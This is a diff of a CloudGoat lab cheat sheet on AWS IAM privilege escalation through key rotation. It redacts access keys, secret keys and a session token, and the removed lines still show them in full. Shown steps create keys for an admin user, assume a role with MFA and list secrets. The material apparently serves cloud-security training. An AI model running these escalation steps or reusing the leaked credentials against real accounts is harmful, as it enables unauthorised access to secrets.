@@ -1,8 +1,8 @@
 # IAM Privecs by Key Rotation Cheat Sheet
 
 ```bash
-export AWS_ACCESS_KEY_ID=AKIAZ6IIT5XU4PXVYLG3
-export AWS_SECRET_ACCESS_KEY=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
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=RjW4jK6hMm....
 ```
 
 Enumerate the credentials
@@ -30,9 +30,9 @@ aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgo
 # {
 #     "AccessKey": {
 #         "UserName": "admin_iam_privesc_by_key_rotation_<cloudgoat_id>",
-#         "AccessKeyId": "AKIAZ6IIT5XU43X35JUX",
+#         "AccessKeyId": "AKIA....",
 #         "Status": "Active",
-#         "SecretAccessKey": "GQg+9Me8LmB+099t6GAY7gRIp5BV544IizMv+5hN",
+#         "SecretAccessKey": "GQg+9Me8LmB+099t6....",
 #         "CreateDate": "2023-09-04T19:20:02+00:00"
 #     }
 # }
@@ -41,8 +41,8 @@ aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgo
 With the "admin" users credentials we can assume the role it has access to...
 
 ```bash
-export AWS_ACCESS_KEY_ID=AKIAZ6IIT5XU43X35JUX
-export AWS_SECRET_ACCESS_KEY=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
+export AWS_ACCESS_KEY_ID=AKIA....
+export AWS_SECRET_ACCESS_KEY=GQg+9Me8LmB....
 
 aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret
 # Access Denied
@@ -73,9 +73,9 @@ Now we can assume the role since were using mfa
 aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code 798934
 # {
 #     "Credentials": {
-#         "AccessKeyId": "ASIAZ6IIT5XUWLL7H2H2",
-#         "SecretAccessKey": "Mm8ij9L8eVAK0GXiXo0B1FWkC+ro4TZQfFMI7lIq",
-#         "SessionToken": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJHMEUCIQDtxJUyGLnXR9xI6aha12o+YuJQBpMDuJBASX9ucGzf6gIgEvFrIs7bxo/tHYNFGiiweAxHs7kGNJnNo/pjbHeKo9YqnQIITRACGgw2ODM0NTQ3NTQyODEiDA898Itrb4va2Vmpbir6AZpo/LXWLxvH54yGPRpptxHNmIwqI/UZ+QBH28XSh7MQ6FKUqtbJKcGCPQF6QQVW6ZaCNwGSW/Xm7DVmhTJWCKDHgZkhwcEX4tOs2J5mwrXa6pjujIvBBTjSk0xs+ihUDut811bbrqPLo+RRutdklRH1DbZJPzIApK9+QWzJwajUNys2n8FblI2gAV3jvz1875gWQ+aR2o3VsRYEGBWj0U4IP7kuW4SgDEfU/NyeYXISXSnk1+BMalOYQ+IjiTvU9cTsvqZzl78BTaeT68glCE6dj5gnIFjsnERSnVE3bRs9zCZhXim/7vC82aumrNDCx7jx9aTgH9rP5dwwzOPYpwY6nQFd91gjpAbIvtWWG1B0r9Rj57JptcQtIqUyCipT1bgkK2K2C0cNGfzcd9gGAldf2X316iBdQXY9zgd0QevvdPzKzWmjnDybGve7TNBstFVCFAdRx62qdLbOR3GtjPwWbRZwI12jvG/PYOfq3fFqg+lD14IaF1i0JXXens9Ggg18FdBv9wSx2WXvIr2ApBqmJgxWNoxxIdsbDeiusoi0",
+#         "AccessKeyId": "ASIA...",
+#         "SecretAccessKey": "Mm8ij9L8eV.....",
+#         "SessionToken": "IQoJb3JpZ2luX2VjE..................",
 #         "Expiration": "2023-09-04T20:36:44+00:00"
 #     },
 #     "AssumedRoleUser": {
@@ -88,9 +88,9 @@ aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_ia
 In a new shell retreive the secret
 
 ```bash
-export AWS_ACCESS_KEY_ID=ASIAZ6IIT5XUWLL7H2H2
-export AWS_SECRET_ACCESS_KEY=Mm8ij9L8eVAK0GXiXo0B1FWkC+ro4TZQfFMI7lIq
-export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJHMEUCIQDtxJUyGLnXR9xI6aha12o+YuJQBpMDuJBASX9ucGzf6gIgEvFrIs7bxo/tHYNFGiiweAxHs7kGNJnNo/pjbHeKo9YqnQIITRACGgw2ODM0NTQ3NTQyODEiDA898Itrb4va2Vmpbir6AZpo/LXWLxvH54yGPRpptxHNmIwqI/UZ+QBH28XSh7MQ6FKUqtbJKcGCPQF6QQVW6ZaCNwGSW/Xm7DVmhTJWCKDHgZkhwcEX4tOs2J5mwrXa6pjujIvBBTjSk0xs+ihUDut811bbrqPLo+RRutdklRH1DbZJPzIApK9+QWzJwajUNys2n8FblI2gAV3jvz1875gWQ+aR2o3VsRYEGBWj0U4IP7kuW4SgDEfU/NyeYXISXSnk1+BMalOYQ+IjiTvU9cTsvqZzl78BTaeT68glCE6dj5gnIFjsnERSnVE3bRs9zCZhXim/7vC82aumrNDCx7jx9aTgH9rP5dwwzOPYpwY6nQFd91gjpAbIvtWWG1B0r9Rj57JptcQtIqUyCipT1bgkK2K2C0cNGfzcd9gGAldf2X316iBdQXY9zgd0QevvdPzKzWmjnDybGve7TNBstFVCFAdRx62qdLbOR3GtjPwWbRZwI12jvG/PYOfq3fFqg+lD14IaF1i0JXXens9Ggg18FdBv9wSx2WXvIr2ApBqmJgxWNoxxIdsbDeiusoi0
+export AWS_ACCESS_KEY_ID=ASIA....
+export AWS_SECRET_ACCESS_KEY=Mm8ij9L8eV....
+export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE..................
 
 aws secretsmanager list-secrets
 
